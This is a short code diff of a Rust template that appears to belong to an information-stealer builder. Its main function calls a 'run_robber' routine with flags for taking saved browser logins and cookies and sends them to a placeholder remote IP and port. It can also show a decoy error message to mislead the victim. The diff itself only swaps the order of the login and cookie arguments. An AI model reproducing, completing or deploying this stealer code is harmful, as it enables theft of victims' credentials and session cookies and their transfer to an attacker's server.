@@ -11,7 +11,7 @@ fn main() -> () {
     let error: bool = <<ERROR_BOOL>>;
     let error_message = r#"<<ERROR_MESSAGE>>"#;
     let url = "http://<<IP_ADDRESS>>:<<PORT>>";
-    let _ = browser::run_robber(<<LOGIN_BOOL>>, <<COOKIES_BOOL>>, url);
+    let _ = browser::run_robber(<<COOKIES_BOOL>>, <<LOGIN_BOOL>>, url);
     if error == true {
         let _ = show_error(error_message);
     }
